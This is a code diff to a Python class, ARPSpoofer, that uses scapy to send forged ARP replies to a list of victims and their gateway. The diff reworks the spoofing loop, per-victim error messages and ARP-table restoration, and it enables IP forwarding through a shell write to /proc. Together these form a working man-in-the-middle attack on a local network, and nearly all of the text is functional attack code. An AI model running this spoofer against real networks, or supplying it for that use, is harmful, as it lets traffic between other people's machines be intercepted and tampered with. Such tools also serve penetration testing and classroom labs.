@@ -26,7 +26,6 @@ class ARPSpoofer:
         return answered_list[0][1].hwsrc
 
     def spoof(self, target_ip, spoof_ip, target_mac):
-        # target_mac = get_mac(target_ip)
         # Response ARP packet that send to the destination configured and tell them we have the router ip
         packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
         scapy.send(packet, verbose=False)
@@ -45,54 +44,38 @@ class ARPSpoofer:
             except IndexError:
                 self.progress.emit("[-] Failed to obtain target's MAC address, it might be caused by target not "
                                    "responding to ARP Request, retrying...")
-        while True:
+        while self.stop == 0:
             for victim_ip in self.victim_ips:
-                # Get victim's MAC address
-                victim_arp_reply = False
-                while victim_arp_reply is False and self.stop == 0:
-                    try:
-                        victim_mac = self.get_mac(victim_ip)
-                        victim_arp_reply = True
-                    except IndexError:
-                        self.progress.emit(
-                            "[-] Failed to obtain victim's MAC address, it might be caused by target not responding "
-                            "to ARP Request, retrying...")
-                # Start spoofing
-                self.spoof(victim_ip, self.gateway_ip, victim_mac)
-                self.spoof(self.gateway_ip, victim_ip, gateway_mac)
-                self.sent_packets_count += 2
-                self.progress.emit("[+] 2 ARP packets sent")
-                print("\r[+] Packets sent: " + str(self.sent_packets_count), end="")
-                if self.stop == 1:
-                    break
-                time.sleep(2)
-            if self.stop == 1:
-                break
+                try:
+                    victim_mac = self.get_mac(victim_ip)
+                    # Start spoofing
+                    self.spoof(victim_ip, self.gateway_ip, victim_mac)
+                    self.spoof(self.gateway_ip, victim_ip, gateway_mac)
+                    self.sent_packets_count += 2
+                    self.progress.emit(f"[+] 2 ARP packets sent to: {victim_ip}")
+                    time.sleep(2)
+                except IndexError:
+                    self.progress.emit(
+                        f"[-] Failed to obtain victim's MAC address ({victim_ip}), it might be caused by target not responding "
+                        f"to ARP Request")
         # Conclude results and restore IPTables rules
-        self.progress.emit("[+] Resetting ARP Tables... Please wait.")
-        print("\n[+] Detected CTRL + C ..... Resetting ARP tables..... Please wait.\n")
         for victim_ip in self.victim_ips:
             self.restore(victim_ip, self.gateway_ip)
             self.restore(self.gateway_ip, victim_ip)
-        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
-        self.progress.emit("[+] Disabled IP forwarding")
         self.progress.emit("[+] Total packets sent: " + str(self.sent_packets_count))
 
     def restore(self, target_ip, source_ip):
         target_mac = None
         source_mac = None
         # Obtain MAC addresses
-        target_arp_reply = False
-        source_arp_reply = False
         try:
             target_mac = self.get_mac(target_ip)
             source_mac = self.get_mac(source_ip)
             packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
             scapy.send(packet, verbose=False, count=4)
         except IndexError:
-            self.progress.emit("[-] Failed to restore target/victim ARP table, it might be caused by target/victim not "
-                               "responding to ARP Request")
+            self.progress.emit(f"[-] Failed to restore target/victim ARP table ({target_ip}, {source_ip}), it might be caused by " 
+                                "target/victim not responding to ARP Request")
 
     def enable_ip_forwarding(self):
-        print("\n[+] Enabling IP forwarding.....\n")
         subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
